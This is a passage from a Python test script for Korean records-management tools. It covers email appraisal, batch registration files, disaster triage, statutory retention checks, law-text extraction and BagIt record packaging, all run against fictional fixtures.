    mk("lee@test.go.kr", "kim@test.go.kr", "회신: 예산 협의", "민원인 연락처 010-9876-5432 입니다.", "Tue, 03 Mar 2026 10:00:00 +0900")
    mk("park@test.go.kr", "kim@test.go.kr", "Ⅲ급 비밀 보고", "내용", "Wed, 04 Mar 2026 11:00:00 +0900")
    box.flush()
    code, out = run([S("email-appraisal", "scripts", "email_report.py"), f"{t}/보관함.mbox", "-o", f"{t}/산출/email.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/email.xlsx")
    msgs = list(wb["메시지 목록"].iter_rows(min_row=2, values_only=True))
    flat = " ".join(str(c) for ws in wb.worksheets for r in ws.iter_rows(values_only=True) for c in r if c)
    ok_em = len(msgs) == 3 and msgs[0][5] == 1 and "휴대전화" in (msgs[1][6] or "") and "비밀" in (msgs[2][7] or "") \
        and "검토 부탁드립니다" not in flat and "9876-5432" not in flat and wb["첨부 목록"].max_row == 2
    check("이메일: 3통 목록·첨부·개인정보·비밀 표시, 본문·원문 값 미포함", ok_em, out)
    with open(f"{t}/주요직위.csv", "w", encoding="utf-8-sig") as fh:
        fh.write("주소,직위,구분\npark@test.go.kr,차관,주요 직위\n")
    code2, out2 = run([S("email-appraisal", "scripts", "email_report.py"), f"{t}/보관함.mbox", "--roles", f"{t}/주요직위.csv", "-o", f"{t}/산출/email_role.xlsx"])
    wr = openpyxl.load_workbook(f"{t}/산출/email_role.xlsx")
    rl = [r[9] for r in wr["메시지 목록"].iter_rows(min_row=2, values_only=True)]
    sm = " ".join(str(c) for r in wr["요약"].iter_rows(values_only=True) for c in r if c)
    check("이메일 역할기반(캡스톤) 후보: 주요 직위 계정 표시·일반 계정 구분·국내 법정 기준 아님 안내",
          sum(1 for x in rl if str(x).startswith("역할기반")) == 1 and "차관" in str(rl[2]) and "일반 계정" in str(rl[0]) and "법정 기준이 아니며" in sm, out2 + str(rl))
    # RAMP 일괄등록 파일(기록물통합서비스플랫폼 일괄등록 규격 2024)
    _rf = openpyxl.load_workbook(S("listing-qa", "assets", "RAMP_일괄등록_서식_2024.xlsx"), read_only=True, data_only=True)
    _hd = {sh: [c for c in list(_rf[sh].iter_rows(values_only=True))[2] if c] for sh in ("철 등록부", "기록물등록대장")}
    _rw = openpyxl.Workbook(); _rw.remove(_rw.active)
    def _sheet(name, rows):
        w_ = _rw.create_sheet(name); w_.append([]); w_.append(["안내"]); w_.append(_hd[name])
        for rr in rows:
            w_.append([rr.get(str(h).replace("\n", "").lstrip("*").split("(YYYY")[0].split("[")[0].strip(), "") for h in _hd[name]])
    _sheet("철 등록부", [dict(시스템구분="03", 처리과기관코드="1234567", **{"구기록물 철생산기관명": "가상시 가상과", "생산년도": "2025", "단위과제여부": "1",
        "단위업무코드": "AB000012", "기록물철 등록일련번호": "1", "권호수": "1", "기록물철 제목": "가상 계획", "기록물형태": "1", "시작연도": "2025", "종료연도": "2025",
        "보존기간": "영구", "보존방법": "3", "보존장소": "1", "기록물구분(신/구)": "1", "기록물등록건수": "2", "기록물쪽수": "10", "전자파일개수": "0", "열람조건": "01"})])
    _base_d = {"시스템구분": "03", "처리과기관코드": "1234567", "구기록물 생산기관명": "가상시 가상과", "등록구분": "1", "생산(접수)등록일자": "202503020900",
               "분리등록번호(첨부번호)": "0", "제목": "가상 보고", "쪽수": "6", "기안자(업무담당자)": "가상", "전자기록물여부": "2",
               "분류번호": "1234567AB0000122025000001001", "특수기록물": "NNNNN", "공개여부": "1NNNNNNNN", "구기록물보존기간": "40",
               "기록물구분(신/구)": "1", "건일련번호": "1", "열람조건": "01"}
    _sheet("기록물등록대장", [dict(_base_d, **{"생산(접수)등록번호": "1234567000001"}), dict(_base_d, **{"생산(접수)등록번호": "1234567000002", "쪽수": "3", "건일련번호": "2", "공개여부": "3NNNNNNNN"})])
    _rw.save(f"{t}/RAMP서식.xlsx")
    crb, orb = run([S("listing-qa", "scripts", "ramp_batch.py"), f"{t}/RAMP서식.xlsx", "--registrar", "1234567,기록연구사,가상,gasang", "--date", "20261121090000",
                    "-o", f"{t}/산출/RAMP"])
    rbi = [r for r in openpyxl.load_workbook(f"{t}/산출/RAMP/일괄등록_점검.xlsx")["점검"].iter_rows(min_row=2, values_only=True)] if os.path.exists(f"{t}/산출/RAMP/일괄등록_점검.xlsx") else []
    dl = open(f"{t}/산출/RAMP/DOCU.TXT", encoding="utf-8").read().split("\t") if os.path.exists(f"{t}/산출/RAMP/DOCU.TXT") else []
    rbs = " ".join(str(c) for r in rbi for c in r)
    check("RAMP 일괄등록: DOCU/DETAIL 43·53칸·보존기간 코드(영구→40)·일련번호 자리 맞춤·등록자 채움·보존장소·건수·쪽수·공개여부 점검",
          crb == 1 and len(dl) == 43 and dl[14] == "40" and dl[7] == "000001" and dl[8] == "001" and dl[-1].strip() == "20261121090000" and dl[-3] == "가상"
          and "보존장소" in rbs and "건 쪽수 합 9" in rbs and "모두 N" in rbs and "철 등록부에 없는 철" not in rbs, orb + rbs)

    # 행정정보DB구축 기록물 일괄등록(행정정보DB구축 기록물의 기록관리시스템 규격 2023)
    DBS = S("listing-qa", "scripts", "dbproject_batch.py")
    run([DBS, "--template", f"{t}/행정DB서식.xlsx"])
    _dw = openpyxl.load_workbook(f"{t}/행정DB서식.xlsx")
    def _put(ws, **kw):
        h = [str(c.value).lstrip("*") for c in ws[1]]
        ws.delete_rows(2)
        ws.append([kw.get(x, "") for x in h])
    _cls = "1234567" + "99999999" + "1998" + "000001" + "001"
    _put(_dw["기록물철등록부"], 처리과기관코드="1234567", 구기록물철생산기관명="가상부 가상과", 생산년도="1998", 기록물철등록일련번호="1", 기록물철제목="가상 접수철",
         기록물형태="1", 시작년도="1998", 종료연도="1998", 보존기간="영구", 보존방법="3", 보존장소="2", 기록물등록건수="1", 기록물쪽수="5")
    _put(_dw["기록물등록대장"], 처리과기관코드="1234567", 구기록물생산기관명="가상과", 등록구분="1", 제목="가상 보고", 쪽수="3", 분류번호=_cls,
         구기록물보존기간="영구", 건일련번호="1", 공개여부="1NNNNNNNN", **{"생산(접수)등록일자": "199806041400", "생산(접수)등록번호": "1234567000001"})
    _dw.remove(_dw["특수목록"])
    _dw.save(f"{t}/행정DB목록.xlsx")
    _ip = f"{t}/행정DB이미지/{_cls}/1998123456700000100"
    os.makedirs(_ip, exist_ok=True)
    open(f"{_ip}/00000001.TIF", "wb").write(b"II*")
    open(f"{_ip}/00000003.TIF", "wb").write(b"")
    cdb, odb = run([DBS, f"{t}/행정DB목록.xlsx", "--images", f"{t}/행정DB이미지", "-o", f"{t}/산출/행정DB"])
    dbs = " ".join(str(c) for r in openpyxl.load_workbook(f"{t}/산출/행정DB/행정DB일괄등록_점검.xlsx")["점검"].iter_rows(values_only=True) for c in r) if os.path.exists(f"{t}/산출/행정DB/행정DB일괄등록_점검.xlsx") else ""
    dd = open(f"{t}/산출/행정DB/DOCU.TXT", encoding="cp949").read().rstrip("\r\n").split("\t") if os.path.exists(f"{t}/산출/행정DB/DOCU.TXT") else []
    check("행정정보DB구축 일괄등록: 철 31칸·고정값(99999999·000000)·영구→40·쪽수 합 불일치·이미지 0바이트·일련번호 빠짐 점검",
          cdb == 1 and len(dd) == 31 and dd[2] == "99999999" and dd[12] == "40" and dd[23] == "000000" and "쪽수 합(3)" in dbs
          and "크기가 '0'" in dbs and "일련번호들을 확인" in dbs and "기록물철에 기록물건이 존재하지 않습니다" not in dbs, odb + dbs)

    # 재난 피해 행정박물 응급조치(2024. 12.)·보존 취약 종이기록물 예방조치(2024. 11.)
    xlsx(f"{t}/피해박물.xlsx", [["관리번호", "명칭", "재질", "형태", "피해", "손상유형", "훼손도", "수량", "위치", "비고"],
        ["P1", "가상 접시", "도자기", "식기", "화재", "B,D", "1", "3", "2층", ""], ["P2", "가상 제복", "직물", "의복", "수해", "A,E", "3", "2", "1층", "염색"],
        ["P3", "가상 현판", "목재", "현판", "수해", "A", "2", "1", "1층", ""]])
    cat, oat = run([S("disaster-recovery", "scripts", "artifact_triage.py"), f"{t}/피해박물.xlsx", "--found", "2026-07-15 09:00", "--now", "2026-07-17 12:00", "-o", f"{t}/산출/박물응급.xlsx"])
    atr = [r for r in openpyxl.load_workbook(f"{t}/산출/박물응급.xlsx")["응급조치 순서"].iter_rows(min_row=2, values_only=True)] if os.path.exists(f"{t}/산출/박물응급.xlsx") else []
    xlsx(f"{t}/보유박물.xlsx", [["관리번호", "명칭", "보존기간", "생산연도", "생산기관", "보존가치", "상징성"], ["Q1", "가", "영구", "1955", "외교부", "높음", "높음"],
        ["Q2", "나", "준영구", "1975", "행정안전부", "보통", "보통"]])
    cap, oap = run([S("disaster-recovery", "scripts", "artifact_triage.py"), f"{t}/보유박물.xlsx", "--prepare", "-o", f"{t}/산출/박물구조.xlsx"])
    apr = [r for r in openpyxl.load_workbook(f"{t}/산출/박물구조.xlsx")["구조 우선순위"].iter_rows(min_row=2, values_only=True)] if os.path.exists(f"{t}/산출/박물구조.xlsx") else []
    check("행정박물 응급조치: 직물 48시간 지남·염색 먼저·목재 24시간·도자기 후순위·화재 물 금지, 구조 우선순위 1·4등급",
          cat == 0 and [r[1] for r in atr] == ["P2", "P3", "P1"] and "48시간 지남" in str(atr[0][12]) and atr[2][9] == "후순위" and "물·수분 절대" in str(atr[2][11])
          and [r[8] for r in apr] == ["1", "4"], oat + oap + str(atr))
    xlsx(f"{t}/예방목록.xlsx", [["관리번호", "철제목", "매수", "재질", "규격", "편철", "상태", "해당 면"], ["F1", "가상 팩스철", "80", "감열지", "A4", "클립", "", "3-5,8"],
        ["F2", "가상 대장", "650", "청사진", "A4", "", "", ""], ["F3", "가상 철", "60", "일반", "A4", "", "바스라짐", ""], ["F4", "가상 정상", "50", "일반", "A4", "", "", ""]])
    cpc, opc = run([S("preservation-inspection", "scripts", "preventive_care.py"), f"{t}/예방목록.xlsx", "-o", f"{t}/산출/예방조치.xlsx"])
    wpc = openpyxl.load_workbook(f"{t}/산출/예방조치.xlsx") if os.path.exists(f"{t}/산출/예방조치.xlsx") else None
    pcr = [r for r in wpc["예방조치 계획"].iter_rows(min_row=2, values_only=True)] if wpc else []
    pcs = {r[0]: r[1] for r in wpc["용품 준비"].iter_rows(min_row=2, values_only=True)} if wpc else {}
    check("예방조치: 감열지 간지(면 4)·청사진은 사진 아님·금속철 제거·거대 편철 500매 초과·훼손 심화 봉투+복원 연계·정상 철 제외",
          cpc == 0 and {(r[0], r[4]) for r in pcr} == {("F1", "감열지"), ("F1", "금속철"), ("F2", "감광지"), ("F2", "거대 편철"), ("F3", "훼손 심화")}
          and pcs.get("간지") == 5 and any(r[10] for r in pcr if r[0] == "F3"), opc + str(pcr))

    # 대학·의료기관 보존기간 가이드 대조
    open(f"{t}/대학기준표.csv", "w", encoding="utf-8-sig").write("단위과제명,보존기간\n학생증발급,3년\n학사일정관리,10년\n자격증관리대장,10년\n")
    csg, osg = run([S("retention-review", "scripts", "sector_guide_lookup.py"), f"{t}/대학기준표.csv", "--sector", "대학", "-o", f"{t}/산출/대학가이드.xlsx"])
    sgr = [r for r in openpyxl.load_workbook(f"{t}/산출/대학가이드.xlsx")["대조"].iter_rows(min_row=2, values_only=True)] if os.path.exists(f"{t}/산출/대학가이드.xlsx") else []
    cmd, omd = run([S("retention-review", "scripts", "sector_guide_lookup.py"), "--sector", "의료", "--find", "응급의료"])
    check("대학·의료 가이드: 유사 단위과제로 맞춤(학생증발급→학생증관리 5년)·짧음 2건·의료 135과제 검색",
          csg == 1 and len(sgr) == 3 and sgr[0][6] == "학생증관리" and sgr[0][8] == "5년" and sgr[2][8] == "준영구" and "/135과제" in omd, osg + omd)
    open(f"{t}/의료기준표.csv", "w", encoding="utf-8-sig").write("단위과제명,보존기간\n의무기록 관리,5년\n처방전 관리,1년\n수술기록 관리,10년\n간호기록 관리,3년\n진단서 발급,3년\n외래진료계획 수립,5년\n")
    cml, oml = run([S("retention-review", "scripts", "sector_guide_lookup.py"), f"{t}/의료기준표.csv", "--sector", "의료", "-o", f"{t}/산출/의료가이드.xlsx"])
    wml = openpyxl.load_workbook(f"{t}/산출/의료가이드.xlsx") if os.path.exists(f"{t}/산출/의료가이드.xlsx") else None
    mlr = {r[2]: (r[14], r[15], r[16]) for r in wml["대조"].iter_rows(min_row=2, values_only=True)} if wml else {}
    check("의료법 시행규칙 제15조①: 진료기록 5년·처방전 1년·간호기록 3년 법정 최소 미달, 수술기록 10년·진단서 3년 충족, 해당 없는 과제 비움",
          cml == 1 and "법정 최소 미달 3" in oml and mlr.get("의무기록 관리", ("",))[0] == "2호 진료기록부" and mlr["처방전 관리"][1] == "2년"
          and mlr["간호기록 관리"][2].startswith("법정 최소 미달") and mlr["수술기록 관리"][2] == "충족" and mlr["진단서 발급"][2] == "충족"
          and not mlr["외래진료계획 수립"][0] and "의료법 법정 보존기간" in wml.sheetnames, oml + str(mlr))
    open(f"{t}/법정기준표.csv", "w", encoding="utf-8-sig").write("단위과제명,보존기간,단위과제 설명\n무기계약직 근로계약 관리,1년,\n기간제 근로자 급여 지급,3년,\n"
        "산업안전보건위원회 운영,1년,\n작업환경측정,3년,\n소방시설 자체점검,1년,\n부가가치세 신고,3년,\n회의 운영 일반,1년,\n복무 관리,1년,휴가계획 취합\n")
    cst, ost = run([S("retention-review", "scripts", "statutory_check.py"), f"{t}/법정기준표.csv", "-o", f"{t}/산출/법정점검.xlsx"])
    sst = {r[2]: (r[7], r[10], r[11]) for r in openpyxl.load_workbook(f"{t}/산출/법정점검.xlsx")["점검"].iter_rows(min_row=2, values_only=True)} if os.path.exists(f"{t}/산출/법정점검.xlsx") else {}
    check("법정 보존기간(근로기준법·산안법·국세기본법·소방): 미달 5·제안(2년→3년, 5년→5년)·충족·설명 낱말은 '확인 필요'·해당 없는 과제 제외",
          cst == 1 and "법정 최소 미달 5" in ost and "확인 필요 1" in ost and sst.get("산업안전보건위원회 운영", ("",))[0] == "2년"
          and sst["산업안전보건위원회 운영"][2] == "3년" and sst["작업환경측정"][2] == "5년" and sst["부가가치세 신고"][2] == "5년"
          and sst["기간제 근로자 급여 지급"][1] == "충족" and sst["복무 관리"][1].startswith("확인 필요") and "회의 운영 일반" not in sst, ost + str(sst))
    open(f"{t}/법정기준표2.csv", "w", encoding="utf-8-sig").write("단위과제명,보존기간\n장애인 인식개선 교육,1년\n개인정보처리시스템 접속기록 관리,1년\n"
        "교사내 공기질 측정,5년\n어린이집 CCTV 운영,1년\n재난상황 관리,3년\n공무원 제안 관리,1년\n사회보장급여 신청 및 조사,10년\n")
    cs2, os2 = run([S("retention-review", "scripts", "statutory_check.py"), f"{t}/법정기준표2.csv", "-o", f"{t}/산출/법정점검2.xlsx"])
    w2 = openpyxl.load_workbook(f"{t}/산출/법정점검2.xlsx") if os.path.exists(f"{t}/산출/법정점검2.xlsx") else None
    s2 = {}
    for r in (w2["점검"].iter_rows(min_row=2, values_only=True) if w2 else []):
        s2.setdefault(r[2], []).append((r[4], r[7], r[10]))
    cf, ofd = run([S("retention-review", "scripts", "statutory_check.py"), "--find", "인식개선 교육"])
    check("법정 보존기간(공공기관 공통): 장애인 인식개선 3년(두 법)·재난상황 5년·제안 2년 미달, 접속기록 1년·CCTV 60일 충족, 학교 교사 공기질 제외, 전체 목록 후보 시트·--find",
          cs2 == 1 and "법정 최소 미달 4" in os2 and "파기 상한 초과 1" in os2 and any(x[0] == "장애인복지법" and x[2].startswith("법정") for x in s2.get("장애인 인식개선 교육", []))
          and any(x[1] == "5년" and x[2].startswith("법정") for x in s2.get("재난상황 관리", [])) and any(x[1] == "60일" and x[2] == "충족" for x in s2.get("어린이집 CCTV 운영", []))
          and any(x[1] == "1년" and x[2] == "충족" for x in s2.get("개인정보처리시스템 접속기록 관리", [])) and "교사내 공기질 측정" not in s2
          and "전체 목록 후보" in w2.sheetnames and "장애인복지법 제25조의2" in ofd and "전체 목록" in ofd, os2 + str(s2) + ofd[-300:])
    import importlib.util as _ilu
    _sp = _ilu.spec_from_file_location("scb", S("retention-review", "scripts", "statutory_catalog_build.py"))
    _scb = _ilu.module_from_spec(_sp)
    _sp.loader.exec_module(_scb)
    _body = ("가상법 시행규칙 제1조(목적) 이 규칙은 가상법 시행에 필요한 사항을 정한다. 제2조(기록의 보존) ① 가상관리자는 점검기록을 작성한 날부터 3년간 보존하여야 한다. "
             "② 2015년 1월 1일부터 시행한다. 제3조(서류의 보존) 서류의 보존기간은 다음과 같다. 1. 가상 명부 : 5년 2. 가상 대장 : 10년 "
             "제4조(과태료) 기록을 3년간 보존하지 아니한 자에게는 과태료를 부과한다. 제5조(신고) 변경한 날부터 30일 이내에 신고하여야 한다. "
             "부 칙 <가상부령 제1호, 2026. 1. 1.> 제1조(시행일) 이 규칙은 공포한 날부터 시행한다. 제2조(경과조치) 종전 기록은 7년간 보존하여야 한다.")
    _ex = _scb.extract("가상법 시행규칙 [시행 2026. 1. 1.] [가상부령 제1호]", _body)
    _ks = {(r["조문"].split("(")[0], r["보존기간"]) for r in _ex}
    check("법정 보존기간 목록 다시 만들기(추출기): 'N년간 보존'·나열형 'N년'·기산 문구, 날짜·과태료·N일 이내 신고·부칙 경과조치 제외",
          _ks == {("제2조", "3년"), ("제3조", "5년"), ("제3조", "10년")} and any("작성한 날부터" in r["기산(문구)"] for r in _ex)
          and all(r["원문"].startswith("https://www.law.go.kr/법령/가상법시행규칙/") for r in _ex), str(_ex))
    _ex2 = _scb.extract("가상법 [시행 2026. 1. 1.]", "가상법 제1조(목적) 목적이다. 제2조(정보의 파기) 가상정보는 수집한 날부터 5년이 지나면 파기하여야 한다. "
                        "제3조(서식) 결의서 보존기간 10년 접수 제3조의3(협의) 관할 영구기록물관리기관의 장과 협의하여 관리하여야 한다. 제3조의2(안내) 단위과제 보존기간(1년, 3년, 5년, 10년, 30년, 준영구, 영구)을 적는다. 제4조(편철) 신청서는 편철하여 3년간 보존 2. 대장은 1년간 보존 제5조(보존) 기록부의 보존 기간은 마지막으로 적은 날부터 5년으로 하고, 방법은 따로 정한다.")
    _k2 = {(r["조문"].split("(")[0], r["보존기간"], r["성격"]) for r in _ex2}
    check("법정 보존기간 추출 2차: 보존기간 구분 나열(1년, 3년, 5년 …)·'영구기록물관리기관' 이름 속 '영구'는 뺌, '5년이 지나면 파기'는 상한, 서식 칸 '보존기간 10년'·나열 '3년간 보존 2.'·'보존 기간은 … 5년으로 하고'는 최소 보존",
          ("제2조", "5년", "지나면 파기(상한)") in _k2 and ("제3조", "10년", "최소 보존") in _k2 and ("제4조", "3년", "최소 보존") in _k2
          and ("제4조", "1년", "최소 보존") in _k2 and ("제5조", "5년", "최소 보존") in _k2 and not any(k[0] in ("제3조의2", "제3조의3") for k in _k2), str(_k2))
    _ex3 = _scb.extract("가상규정 [시행 2026. 1. 1.]", "가상규정 제1-1조 (목적) 목적이다. 제4-14조(장부외거래 기록) ④ 장부외거래기록은 거래 종료일부터 5년간 보존하여야 한다. "
                        "제5조(기록관) 보존기간이 30년, 준영구, 영구에 해당하는 기록물은 기록관에서 10년간 보존하고 이관한다. 부칙 제1조(시행일) 이 규정은 2009년부터 시행한다.")
    _ex4 = _scb.extract("가상지침 [시행 2026. 1. 1.]", "가상지침 1. 목적 가. 등기 신청서류는 접수한 다음 해부터 3년간 보존한다.")
    _k3 = {(r["조문"].split("(")[0], r["보존기간"]) for r in _ex3}
    check("법정 보존기간 추출 3차: '제4-14조' 꼴·'제1-1조 (목적)' 띄어쓰기, 나열 속 기간만 빼고 같은 문장의 '10년간 보존'은 살림, 조문 번호 없는 지침은 '본문'으로 읽음",
          _k3 == {("제4-14조", "5년"), ("제5조", "10년")} and [(r["조문"], r["보존기간"]) for r in _ex4] == [("본문(조문 번호 없음)", "3년")]
          and _ex4[0]["원문"].endswith("/가상지침"), str(_ex3) + str(_ex4))
    _ex5 = _scb.extract("옛근로법 [시행 1998. 2. 20.]", "옛근로법 제41조(계약서류의 보존) 사용자는 근로자명부와 중요한 서류를 3연간 보존하여야 한다.")
    _hs = S("retention-review", "scripts", "statutory_history.py")
    with open(f"{t}/연혁.csv", "w", encoding="utf-8-sig", newline="") as _f:
        _f.write("기록 종류,법령,판본 시행일,다음 판본 시행일,조문,보존기간,성격,공포,문장\n"
                 "휴가 서류,가상법,1997-12-24,2007-04-11,제41조(계약서류의 보존),2년,최소 보존,,가\n휴가 서류,가상법,2008-01-01,,제42조(계약 서류의 보존),3년,최소 보존,,나\n")
    _, oh1 = run([_hs, "--find", "휴가", "--year", "2003", "-o", f"{t}/연혁.csv"])
    _, oh2 = run([_hs, "--find", "휴가", "--year", "2015", "-o", f"{t}/연혁.csv"])
    check("법정 보존기간 연혁: 옛 법령 '3연간(三年間)'을 3년으로 읽음, 생산연도로 그때 시행 중이던 법정 기간 찾기(2003년 → 2년, 2015년 → 3년)",
          [(r["조문"].split("(")[0], r["보존기간"]) for r in _ex5] == [("제41조", "3년")] and "2년" in oh1 and "3년" not in oh1.split("\n")[0]
          and "3년" in oh2 and "1줄" in oh1 and "1줄" in oh2, str(_ex5) + oh1 + oh2)
    _sp2 = _ilu.spec_from_file_location("shm", S("retention-review", "scripts", "statutory_history.py"))
    _shm = _ilu.module_from_spec(_sp2)
    _sp2.loader.exec_module(_shm)
    _shm.get = lambda u: ('<ul><li><a href="#AJAX" onclick="admRulViewHst(\'Y\',\'22\');return false;" class="on"> 1. 가상 고시<br /> <div class="subtit1_1"> [시행 2026. 7. 1.] [가상위원회고시 제2026-9호, 2026. 7. 1., 일부개정] </div></a></li>'
                          '<li><a href="#AJAX" onclick="admRulViewHst(\'Y\',\'11\');return false;"> 2. (가상위원회) 가상 고시<br /> <div class="subtit1_1"> [시행 2020. 8. 11.] [가상위원회고시 제2020-2호, 2020. 8. 11., 제정] </div></a></li></ul>')
    _av = _shm.admin_versions("22")
    check("법정 보존기간 연혁: 행정규칙(고시) 연혁 목록을 시행일 순 판본으로 읽음",
          [(v["seq"], v["시행"], v["공포"]) for v in _av] == [("11", "20200811", "20200811"), ("22", "20260701", "20260701")] and all(v["행정규칙"] for v in _av), str(_av))
    _sp3 = _ilu.spec_from_file_location("rtree", S("retention-review", "scripts", "retention_tree.py"))
    _rt = _ilu.module_from_spec(_sp3)
    _sp3.loader.exec_module(_rt)
    _law = ("가상안전법 제1조(목적) 목적이다. 제164조(서류의 보존) ① 사업주는 다음 각 호의 서류를 3년(제2호의 경우 2년을 말한다) 동안 보존하여야 한다. "
            "다만, 고용노동부령으로 정하는 바에 따라 보존기간을 연장할 수 있다. 1. 선임에 관한 서류 2. 회의록 3. 안전조치에 관한 사항으로서 고용노동부령으로 정하는 사항을 적은 서류 "
            "② 지도사는 그 업무에 관한 사항으로서 고용노동부령으로 정하는 사항을 적은 서류를 5년 동안 보존하여야 한다. ③ 일반조사를 한 소유주등은 그 결과에 관한 서류를 그 설비의 해체작업이 종료될 때까지 보존하여야 하고, "
            "조사기관은 그 결과에 관한 서류를 3년 동안 보존하여야 한다.")
    _rule = ("가상안전법 시행규칙 제1조(목적) 목적이다. 제240조(안전조치 기록) 법 제164조제1항제3호에서 “고용노동부령으로 정하는 사항”이란 다음 각 호를 말한다. 1. 점검 일시 2. 점검자 "
             "제241조(서류의 보존) ① 법 제164조제1항 단서에 따라 측정 결과를 기록한 서류는 보존기간을 5년으로 한다. 다만, 고용노동부장관이 정하여 고시하는 물질에 대한 기록이 포함된 서류는 그 보존기간을 30년으로 한다. "
             "② 법 제164조제2항에서 “고용노동부령으로 정하는 사항”이란 다음 각 호를 말한다. 1. 의뢰자의 성명 2. 보수액")
    _gosi = ("가상 측정 고시 제1조(목적) 목적이다. 제2조(정의) 이 고시에서 「가상안전법 시행규칙」(이하 “규칙”이라 한다)에서 정하는 바에 따른다. "
             "제5조(물질) 규칙 제186조제1항, 제241조제1항 단서에서 고용노동부장관이 정하여 고시하는 물질이란 다음 각호의 어느 하나를 말한다. 1. 허가대상유해물질 2. 특별관리물질")
    _cp = _rt.Corpus({"가상안전법": _law, "가상안전법 시행규칙": _rule}, {"가상 측정 고시": "[고용노동부고시] " + _gosi})
    _tr = []
    for _jo, _ti, _bd in _cp.arts("가상안전법"):
        if _jo == "제164조":
            _tr = _rt.analyze(_cp, "가상안전법", _jo, _ti, _bd)
    _got = {(r["법령"].split()[-1], r["조문"].split("(")[0], r["항"] + r["호"], r["보존기간"]) for r in _tr}
    check("보존 조문 위임 추적: 호별 기간(3년·제2호 2년), 위임 호→시행규칙 사항, 단서→시행규칙 5년·고시 물질 30년, 항별 위임, 사건 기한·마디 나눔",
          {("가상안전법", "제164조", "①1", "3년"), ("가상안전법", "제164조", "①2", "2년"), ("시행규칙", "제240조", "1", "3년"), ("시행규칙", "제240조", "2", "3년"),
           ("시행규칙", "제241조", "①", "5년"), ("고시", "제5조", "1", "30년"), ("고시", "제5조", "2", "30년"), ("가상안전법", "제164조", "②", "5년"),
           ("시행규칙", "제241조", "②1", "5년"), ("가상안전법", "제164조", "③", "3년")} <= _got
          and any(r["항"] == "③" and "종료될 때까지" in r["보존기간"] for r in _tr)
          and any(r["의무자"] == "지도사" for r in _tr), str(sorted(_got)))
    _cp2 = _rt.Corpus({"가상시 기록 조례": "가상시 기록 조례 제1조(목적) 목적이다. 제5조(보존) 시장은 규칙으로 정하는 서류를 5년간 보존하여야 한다.",
                       "가상시 기록 조례 시행규칙": "가상시 기록 조례 시행규칙 제1조(목적) 목적이다. 제3조(서류) 조례 제5조에서 “규칙으로 정하는 서류”란 다음 각 호를 말한다. 1. 접수대장 2. 처리대장"})
    _tr2 = []
    for _jo, _ti, _bd in _cp2.arts("가상시 기록 조례"):
        _tr2 += _rt.analyze(_cp2, "가상시 기록 조례", _jo, _ti, _bd)
    check("보존 조문 위임 추적: 자치법규 '규칙으로 정하는 서류' → 같은 조례 시행규칙의 각 호",
          {(r["법령"].split()[-1], r["호"], r["보존기간"]) for r in _tr2} >= {("시행규칙", "1", "5년"), ("시행규칙", "2", "5년")}, str(_tr2))
    _pg = ('<tr class="dt"><td class="tNone">1</td><td class="tit" rowspan="2"><input type="hidden" id="list" value="jo" /><a onclick="ordinInfPop(\'111\',\'ELIS\');">'
           '가상군 위원회 조례<br /><span>[시행 2026. 1. 1.][조례 제1호, 2026. 1. 1., 제정]</span></a></td><td rowspan="2">가상군</td>'
           '<td><a onclick="ordinInfPop(\'111\',\'ELIS\',\'\',\'Y\',\'0009\');"> 제9조 회의록 </a></td><td><a onclick="ordinInfPop(\'111\');"> ... 회의록을 5년간 보존하여야 한다. </a></td></tr>'
           '<tr class="dt"><td class="tNone">2</td><td><a onclick="ordinInfPop(\'111\');"> 제10조 수당 </a></td><td><a onclick="ordinInfPop(\'111\');"> ... 최근 3년간 보존하여야 할 ... </a></td></tr>')
    _calls = []
    _scb.get = lambda u: (_calls.append(u), _pg if len(_calls) == 1 else "")[1]
    _scb.DELAY = 0
    _or = _scb.search_ordin("년간 보존")
    check("자치법규 조문 검색 해석: 법규명·시행일·지자체·조문을 쪽 넘어가며 이어 붙임(rowspan), 빈 쪽에서 멈춤",
          len(_or) == 2 and _or[0]["기관"] == "가상군" and _or[1]["조문"] == "제10조 수당" and "가상군 위원회 조례" in _or[1]["자치법규"] and len(_calls) == 2, str(_or))
    cog, oog = run([S("retention-review", "scripts", "statutory_check.py"), "--find", "직장협의회 회의록", "--org", "칠곡군"])
    check("법정 보존기간 전체 목록의 자치법규: --org로 그 지자체 조례만(칠곡군 공무원직장협의회 회의록 3년)",
          cog == 0 and "[자치법규·칠곡군]" in oog and "양양군" not in oog, oog[-400:])

    # 생산 시점 기록화(record-by-design): BagIt 패키지·NAK 8 메타데이터·RiC-O·사건 이력·고정성
    RBD = S("record-by-design", "scripts", "capture.py")
    open(f"{t}/보고원본.txt", "w", encoding="utf-8").write("제목: 2026년 가상 축제 결과 보고\n시행 기획과-123 (2026. 3. 2.)\n문의 010-1234-5678\n가상시장\n")
    crb1, orb1 = run([RBD, "capture", f"{t}/보고원본.txt", "--task", "지역축제운영", "--agency", "가상시", "--dept", "기획과", "--person", "김가상",
                      "--period", "10년", "--activity", "결과 보고", "--relation", "참조:2026-plan", "--id", "R-0001", "-o", f"{t}/산출/기록패키지"])
    pk = f"{t}/산출/기록패키지/R-0001"
    mj = json.load(open(f"{pk}/metadata.json", encoding="utf-8")) if os.path.exists(f"{pk}/metadata.json") else {}
    ld = json.load(open(f"{pk}/context.jsonld", encoding="utf-8")) if os.path.exists(f"{pk}/context.jsonld") else {}
    pubj = json.load(open(f"{pk}/매개/공개데이터.json", encoding="utf-8")) if os.path.exists(f"{pk}/매개/공개데이터.json") else {}
    cv1, ov1 = run([RBD, "verify", pk])
    open(f"{pk}/data/원본/보고원본.txt", "a", encoding="utf-8").write("변조")
    cv2, ov2 = run([RBD, "verify", pk])
    nev = sum(1 for _ in open(f"{pk}/events.jsonl", encoding="utf-8")) if os.path.exists(f"{pk}/events.jsonl") else 0
    open(f"{t}/비밀문서.txt", "w", encoding="utf-8").write("Ⅲ급 비밀\n가상\n")
    crb2, _ = run([RBD, "capture", f"{t}/비밀문서.txt", "--task", "가", "--agency", "가", "--dept", "가", "--period", "10년", "-o", f"{t}/산출/기록패키지"])
    crb3, _ = run([RBD, "capture", f"{t}/보고원본.txt", "--task", "가", "--agency", "가", "--dept", "가", "--period", "10년", "--access", "비공개", "-o", f"{t}/산출/기록패키지"])
    check("생산 시점 기록화: BagIt·NAK 8 무결성·RiC-O 관계·개인정보 후보면 공개 본문 뺌·고정성 통과/변조 실패·비밀 거부·비공개 사유 필수",
          crb1 == 1 and mj.get("23.2 무결성체크값", "") and mj.get("12.2.2 분류명") == "지역축제운영" and ld.get("@type") == "rico:Record"
